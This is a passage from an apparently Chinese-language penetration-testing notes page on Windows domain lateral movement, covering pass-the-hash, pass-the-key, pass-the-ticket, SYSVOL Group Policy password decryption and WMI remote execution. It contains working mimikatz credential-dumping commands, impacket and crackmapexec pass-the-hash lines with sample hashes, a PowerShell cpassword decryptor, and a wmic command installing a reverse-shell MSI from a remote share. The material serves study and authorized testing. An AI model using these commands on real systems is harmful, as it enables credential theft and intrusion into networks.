+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><a href="https://github.com/Hackplayers/evil-winrm"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/Hackplayers/evil-winrm</a></p>
+<h5 id="哈希传递" class="heading-element"><span>0.0.0.15  哈希传递</span>
+  <a href="#%e5%93%88%e5%b8%8c%e4%bc%a0%e9%80%92" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>PTH 在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过 LM Hash 和 NTLM Hash 访问远程主机或服务，而不用提供明文密码。</p>
+<p><strong>如果禁用了 ntlm 认证，PsExec 无法利用获得的 ntlm hash 进行远程连接，但是使用 mimikatz 还是可以攻击成功</strong>。对于 8.1/2012r2，安装补丁 <strong>kb2871997</strong> 的 Win 7/2008r2/8/2012 等，可以使用 AES keys 代替 NT hash 来实现 ptk 攻击</p>
+<pre tabindex="0"><code>##### mimikatz
+privilege::debug      
+##### NTLM
+sekurlsa::logonPasswords     
+##### AES
+sekurlsa::ekeys</code></pre><p><strong>总结：KB2871997 补丁后的影响</strong></p>
+<p><a href="https://www.freebuf.com/column/220740.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/column/220740.html</a></p>
+<p><strong>PTH：打补丁前任意用户都可以连接，打了补丁后只能 administrator 用户才可以连接</strong></p>
+<p><strong>PTK：打补丁前不能连接，打补丁后才能任意用户都可以连接（采用 aes256 连接）</strong></p>
+<p><strong>PTT-票据传递</strong></p>
+<p>PTT 攻击的部分就不是简单的 NTLM 认证了，它是利用 Kerberos 协议进行攻击的，三种常见的攻击方法：</p>
+<p>MS14-068，Golden ticket，SILVER ticket。简单来说就是将连接合法的票据注入到内存中实现连接。</p>
+<p>Golden ticket(黄金票据)，SILVER ticket(白银票据)属于权限维持技术</p>
+<p>MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是 kb3011780</p>
+<h6 id="pth" class="heading-element"><span>0.0.0.15.1  PTH</span>
+  <a href="#pth" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>域渗透-哈希传递攻击(Pass The Hash/Key)</p>
+<p><a href="https://zhuanlan.zhihu.com/p/472019671"target="_blank" rel="external nofollow noopener noreferrer">https://zhuanlan.zhihu.com/p/472019671</a></p>
+<blockquote>
+<p>在域环境中，用户登录计算机时一般使用域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也相同，攻击者就能使用哈希传递攻击的方法来登录内网中的其他主机。使用该方法，攻击者不需要花费时间来对Hash进行爆破，在内网渗透里非常经典。常常适用于域/工作组环境。</p>
+</blockquote>
+<pre tabindex="0"><code>crackmapexec smb 172.22.6.12 -u administrator -H 04d93ffd6f5f6e4490e0de23f240a5e9 -x &#39;type C:\Users\Administrator\flag\flag*&#39;
+
+impacket-wmiexec  XIAORANG/administrator@172.22.6.25   -hashes :04d93ffd6f5f6e4490e0de23f240a5e9</code></pre><p>####### <a href="https://tttang.com/archive/1890/#toc_mimikatzpth"target="_blank" rel="external nofollow noopener noreferrer"><strong>利用Mimikatz进行PTH</strong></a></p>
+<p>Mimikatz内置了哈希传递的功能，需要本地管理员权限。</p>
+<p>① 抓取用户的哈希</p>
+<pre tabindex="0"><code>mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords full&#34; exit</code></pre><p>② 利用抓取的域管理员的NTLM hash进行哈希传递</p>
+<pre tabindex="0"><code>mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::pth /user:Administrator /domain:uf9n1x.com /ntlm:93b95aef15f4d50fab96ffc44a2f326a&#34; exit</code></pre><p>####### <a href="https://tttang.com/archive/1890/#toc_impacketpth"target="_blank" rel="external nofollow noopener noreferrer"><strong>利用impacket进行PTH</strong></a></p>
+<p>Impacket项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有：</p>
+<pre tabindex="0"><code>psexec.py      # 类似PSEXEC的功能示例，使用remcomsvc（https://github.com/kavika13/remcom） smbexec.py     # 与使用remcomsvc的psexec w/o类似的方法。这里描述了该技术。我们的实现更进一步，                    #实例化本地smbserver以接收命令的输出。这在目标计算机没有可写共享可用的情况下很有用。 python3 smbexec.py -hashes :3617ad523f47fc96f24c45943affd954 administrator@192.168.1.131 
+#####-hashes 指定用户完整的哈希，如果LM哈希被废弃，就将其指定为0或者空 
+
+atexec.py      # 此示例通过Task Scheduler服务在目标计算机上执行命令，并返回已执行命令的输出。
+
+wmiexec.py     # 需要开放139和445端口，通过Windows Management Instrumentation使用的半交互式shell，它不需要在目标服务器上安装任何服务/代理，以管理员身份运行，非常隐蔽。
+
+python wmiexec.py -hashes 00000000000000000000000000000:3617ad523f47fc96f24c45943affd954 administrator@192.168.1.131 
+dcomexec.py    # 类似于wmiexec.py的半交互式shell，但使用不同的DCOM端点。目前支持               MMC20.Application，ShellWindows和ShellBrowserWindow对象。</code></pre><p>用法：</p>
+<pre tabindex="0"><code>##### 普通用法
+python3 xxx.py domain/user:password@ip
+##### 哈希传递
+python3 xxx.py domain/user@ip -hashes :93b95aef15f4d50fab96ffc44a2f326a</code></pre><h6 id="ptt" class="heading-element"><span>0.0.0.15.2  PTT</span>
+  <a href="#ptt" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>内网横向移动：Kerberos认证与(哈希)票据传递攻击：https://www.freebuf.com/articles/245872.html</p>
+<p>内网渗透之域内横向技术：票据传递攻击总结https://www.freebuf.com/articles/web/282203.html</p>
+<p>域渗透-票据传递攻击（Pass the Ticket）https://zhuanlan.zhihu.com/p/475689947</p>
+<h6 id="ptk" class="heading-element"><span>0.0.0.15.3  PTK</span>
+  <a href="#ptk" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>密钥传递攻击</p>
+<p>打补丁后的工作组及域连接：</p>
+<pre tabindex="0"><code>sekurlsa::pth /user:webserver-2008 /domain:uf9n1x /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b</code></pre><h5 id="sysvol-组策略" class="heading-element"><span>0.0.0.16  SYSVOL 组策略</span>
+  <a href="#sysvol-%e7%bb%84%e7%ad%96%e7%95%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>在域环境中，有个默认的共享路径</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a6be9d">\\</span>&lt;DOMAIN&gt;<span style="color:#a6be9d">\S</span>YSVOL<span style="color:#a6be9d">\&lt;</span>DOMAIN&gt;\</span></span></code></pre></div><p>SYSVOL 是活动目录存储文件服务副本的共享文件夹，里面包含有登录脚本，组策略数据等，域里的所有用户都能访问这个共享文件。在 SYSVOL 目录下，默认是没有 groups.xml 文件的，必须创建组策略脚本登录才有这个文件。在 groups.xml 文件中，密码是通过 AES-256 加密的，但是微软发布了 AES 的私钥</p>
+<blockquote>
+<p>利用条件</p>
+</blockquote>
+<ul>
+<li><strong>必须创建组策略脚本登录才有这个文件</strong></li>
+</ul>
+<blockquote>
+<p>利用示例</p>
+</blockquote>
+<p>使用 <code>powershell</code> 解密 密码</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Get-DecryptedCpassword</span> {
+</span></span><span style="display:flex;"><span> [<span style="color:#58a1dd">CmdletBinding</span>()]
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">Param</span> (
+</span></span><span style="display:flex;"><span>   [<span style="color:#58a1dd">string</span>] <span style="color:#58a1dd">$Cpassword</span>
+</span></span><span style="display:flex;"><span> )
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">try</span> {
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####Append appropriate padding based on string length</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">$Mod</span> = (<span style="color:#58a1dd">$Cpassword</span>.<span style="color:#58a1dd">length</span> % <span style="color:#a6be9d">4</span>)
+</span></span><span style="display:flex;"><span>   <span style="color:#ff636f">switch</span> (<span style="color:#58a1dd">$Mod</span>) {
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">&#39;1&#39;</span> {<span style="color:#58a1dd">$Cpassword</span> = <span style="color:#58a1dd">$Cpassword</span>.<span style="color:#58a1dd">Substring</span>(<span style="color:#a6be9d">0</span>,<span style="color:#58a1dd">$Cpassword</span>.<span style="color:#58a1dd">Length</span> <span style="color:#a6be9d">-1</span>)}
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">&#39;2&#39;</span> {<span style="color:#58a1dd">$Cpassword</span> += (<span style="color:#a6be9d">&#39;=&#39;</span> * (<span style="color:#a6be9d">4</span> - <span style="color:#58a1dd">$Mod</span>))}
+</span></span><span style="display:flex;"><span>   <span style="color:#a6be9d">&#39;3&#39;</span> {<span style="color:#58a1dd">$Cpassword</span> += (<span style="color:#a6be9d">&#39;=&#39;</span> * (<span style="color:#a6be9d">4</span> - <span style="color:#58a1dd">$Mod</span>))}
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">$Base64Decoded</span> = [<span style="color:#58a1dd">Convert</span>]::<span style="color:#58a1dd">FromBase64String</span>(<span style="color:#58a1dd">$Cpassword</span>)
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####Create a new AES .NET Crypto Object</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">$AesObject</span> = <span style="color:#58a1dd">New-Object</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">Security</span>.<span style="color:#58a1dd">Cryptography</span>.<span style="color:#58a1dd">AesCryptoServiceProvider</span>
+</span></span><span style="display:flex;"><span>   [<span style="color:#58a1dd">Byte[]</span>] <span style="color:#58a1dd">$AesKey</span> =
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">@</span>(<span style="color:#58a1dd">0x4e</span>,<span style="color:#58a1dd">0x99</span>,<span style="color:#58a1dd">0x06</span>,<span style="color:#58a1dd">0xe8</span>,<span style="color:#58a1dd">0xfc</span>,<span style="color:#58a1dd">0xb6</span>,<span style="color:#58a1dd">0x6c</span>,<span style="color:#58a1dd">0xc9</span>,<span style="color:#58a1dd">0xfa</span>,<span style="color:#58a1dd">0xf4</span>,<span style="color:#58a1dd">0x93</span>,<span style="color:#58a1dd">0x10</span>,<span style="color:#58a1dd">0x62</span>,<span style="color:#58a1dd">0x0f</span>,<span style="color:#58a1dd">0xfe</span>,<span style="color:#58a1dd">0xe</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">8</span>,
+</span></span><span style="display:flex;"><span>             
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">0xf4</span>,<span style="color:#58a1dd">0x96</span>,<span style="color:#58a1dd">0xe8</span>,<span style="color:#58a1dd">0x06</span>,<span style="color:#58a1dd">0xcc</span>,<span style="color:#58a1dd">0x05</span>,<span style="color:#58a1dd">0x79</span>,<span style="color:#58a1dd">0x90</span>,<span style="color:#58a1dd">0x20</span>,<span style="color:#58a1dd">0x9b</span>,<span style="color:#58a1dd">0x09</span>,<span style="color:#58a1dd">0xa4</span>,<span style="color:#58a1dd">0x33</span>,<span style="color:#58a1dd">0xb6</span>,<span style="color:#58a1dd">0x6c</span>,<span style="color:#58a1dd">0x1b</span>)
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####Set IV to all nulls to prevent dynamic generation of IV value</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">$AesIV</span> = <span style="color:#58a1dd">New-Object</span> <span style="color:#58a1dd">Byte</span>[](<span style="color:#58a1dd">$AesObject</span>.<span style="color:#58a1dd">IV</span>.<span style="color:#58a1dd">Length</span>)
+</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">$AesObject</span>.<span style="color:#58a1dd">IV</span> = <span style="color:#58a1dd">$AesIV</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">$AesObject</span>.<span style="color:#58a1dd">Key</span> = <span style="color:#58a1dd">$AesKey</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#58a1dd">$DecryptorObject</span> = <span style="color:#58a1dd">$AesObject</span>.<span style="color:#58a1dd">CreateDecryptor</span>()
+</span></span><span style="display:flex;"><span>   [<span style="color:#58a1dd">Byte[]</span>] <span style="color:#58a1dd">$OutBlock</span> = <span style="color:#58a1dd">$DecryptorObject</span>.<span style="color:#58a1dd">TransformFinalBlock</span>(<span style="color:#58a1dd">$Base64Decoded</span>,
+</span></span><span style="display:flex;"><span><span style="color:#a6be9d">0</span>, <span style="color:#58a1dd">$Base64Decoded</span>.<span style="color:#58a1dd">length</span>)
+</span></span><span style="display:flex;"><span>   <span style="color:#ff636f">return</span> [<span style="color:#58a1dd">System.Text.UnicodeEncoding</span>]::<span style="color:#58a1dd">Unicode</span>.<span style="color:#58a1dd">GetString</span>(<span style="color:#58a1dd">$OutBlock</span>)
+</span></span><span style="display:flex;"><span> }
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">catch</span> {<span style="color:#58a1dd">Write-Error</span> <span style="color:#58a1dd">$Error</span>[<span style="color:#a6be9d">0</span>]}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Get-DecryptedCpassword</span> <span style="color:#a6be9d">&#34;I0vK3Yj0SeoHQDxF5skcjt3BOkMZmX6IiqRVKCTo4Z4&#34;</span></span></span></code></pre></div><h5 id="永恒之蓝" class="heading-element"><span>0.0.0.17  永恒之蓝</span>
+  <a href="#%e6%b0%b8%e6%81%92%e4%b9%8b%e8%93%9d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>1.目标计算机开启445端口</p>
+<p>2.一般适用计算机系统 windows7 或windows server2008 R2</p>
+<p>略</p>
+<h5 id="wmi" class="heading-element"><span>0.0.0.18  WMI</span>
+  <a href="#wmi" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><blockquote>
+<p>WMI（Windows Management Instrumentation，Windows管理规范）时一项核心的Windows管理技术。用户可以通过WMI管理本地和远程主机。</p>
+<p>Windows为传输WMI数据提供了两个可用的协议：分布式组件对象模型（Distributed Component Object Model, DCOM）和Windows远程管理（Window Remote Management，WinRM）使得WMI对象的查询、事件注册、WMI类方法的执行和类的创建等操作都能远程运行。</p>
+<p>在横向移动时，可以利用WMI提供的管理功能，通过以获取的用户凭据，与本地或远程主机进行交互，并控制其执行各种行为。目前两种常见的利用方法：
+1、 通过调用WMI的类方法进行远程调用，如Win32_Process类中的Create方法可以在远程主机上创建进程，Win32_Product类的Install方法可以在远程主机上安装恶意的MSI
+2、 远程部署WMI事件订阅，在特定事件发生时触发</p>
+</blockquote>
+<p>条件</p>
+<ul>
+<li>wmi服务开启</li>
+<li>防火墙放行135端口</li>
+</ul>
+<h6 id="常规利用方法" class="heading-element"><span>0.0.0.18.1  常规利用方法</span>
+  <a href="#%e5%b8%b8%e8%a7%84%e5%88%a9%e7%94%a8%e6%96%b9%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>在windows上可以通过wmic.exe和powershell cmelet来使用wmi数据和执行WMI方法。</p>
+<p>wmic.exe是一个与WMI进行交互的命令行工具，拥有大量的WMI对象的默认别名，可以执行许多复杂的查询。powershell也提供了许多可以与WMI进行交互的cmelet，如Invoke-WmiMethod、Set-WmiInstance等</p>
+<p><strong>执行远程查询</strong></p>
+<p>通过WMI查询远程主机上运行的进程信息</p>
+<pre tabindex="0"><code>wmic /node:192.168.1.131 /user:Administrator /password:123qwe@ process list brief # /node 执行远程主机的地址</code></pre><p><strong>创建远程进程</strong>
+通过调用Win32_Process.Create方法在远程主机上创建进程，启动CMD来执行命令</p>
+<p>由于WMIC在执行命令时没有回显，因此可以将执行结果写入文件，然后通过别的方式读取文件</p>
+<pre tabindex="0"><code>wmic /node:192.168.1.131 /user:Administrator /password:123qwe@ process call create &#34;cmd.exe /c ipconfig &gt; C:\result.txt&#34;</code></pre><p><strong>远程安装MSI文件</strong>
+通过调用Win32_Product.Install方法，可以控制远程主机安装恶意MSI文件，从而获得权限</p>
+<pre tabindex="0"><code>wmic /node:192.168.1.131 /user:Administrator /password:123qwe@ product call install PackageLocation=&#34;\\192.168.1.1\mysmb\reverse_tcp.msi&#34;</code></pre><h6 id="常见利用工具" class="heading-element"><span>0.0.0.18.2  常见利用工具</span>
+  <a href="#%e5%b8%b8%e8%a7%81%e5%88%a9%e7%94%a8%e5%b7%a5%e5%85%b7" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>####### 套件impacket-WmiExec</p>
+<p>Impacket项目的Wmiexec.py能够以全交互或半交互的方式，通过WMI在远程主机上执行命令。该工机需要远程主机开启135和445端口，其中445端口用于传输命令执行的回显。</p>
+<pre tabindex="0"><code>python wmiexec.py uf9n1x/Administrator:123qwe@@192.168.1.131 
+
+wmiexec.exe ./administrator:123qwe@@192.168.1.131 &#34;whoami&#34; 
+wmiexec.exe god/administrator:Admin12345@192.168.1.131 &#34;whoami&#34; 
+wmiexec.exe -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.1.131 &#34;whoami&#34; 
+wmiexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 uf9n1x/administrator@192.168.1.131 &#34;whoami&#34;</code></pre><p>####### 自带 cscript 明文传递 有回显</p>
+<pre tabindex="0"><code>cscript //nologo wmiexec.vbs /shell 192.168.1.131 administrator 123qwe@</code></pre><p>####### 自带 WMIC 明文传递 无回显</p>
+<pre tabindex="0"><code>wmic /node:192.168.1.131 /user:administrator /password:123qwe@ process call create &#34;cmd.exe /c ipconfig &gt;C:\1.txt&#34;</code></pre><h6 id="wmi事件订阅的利用" class="heading-element"><span>0.0.0.18.3  WMI事件订阅的利用</span>
+  <a href="#wmi%e4%ba%8b%e4%bb%b6%e8%ae%a2%e9%98%85%e7%9a%84%e5%88%a9%e7%94%a8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>WMI提供了强大的事件处理系统，几乎可以用于操作系统上发生的任何事件做出相应。</p>
+<p>当创建某进程时，通过WMI事件订阅器来执行预先设置的脚本。
+其中触发事件的具体条件被称为“<strong>事件过滤器</strong>”（Event Filter），如用户登录、新进程创建等；对指定事件发生做出相应的称为“<strong>事件消费者</strong>”（Event Consumer），包括一系列具体的操作，如运行脚本、记录日志、发送邮件等。
+在部署事件订阅时，需要分别构建Filter和Consumer两部分，并将两者绑定在一起。</p>
+<p>所有的事件过滤器都被存储在一个<strong>Root\subscription:__EventFiilter</strong>对象的实例，可以通过创建**__EventFilter对象<strong>实例来部署事件过滤器。事件消费者是基于</strong>ROOT\subscription:__EventConsumer系统类**派生来的类。</p>
+<p>系统提供了常用的标准事件消费类</p>
+<pre tabindex="0"><code>LogFileEventConsumer    # 将事件数据写入指定的日志文件 
+ActiveScriptEventConsumer  # 执行嵌入的VBScript或JavaScript 
+NTEventLogEventConsumer      # 创建一个包含事件数据的事件日志条目 
+SMTPEventConsumer            # 发送一封包含事件数据的电子邮件 
+CommandLineEventConsumer     # 执行指定的系统命令</code></pre><p><strong>Sharp-WMIEvent</strong></p>
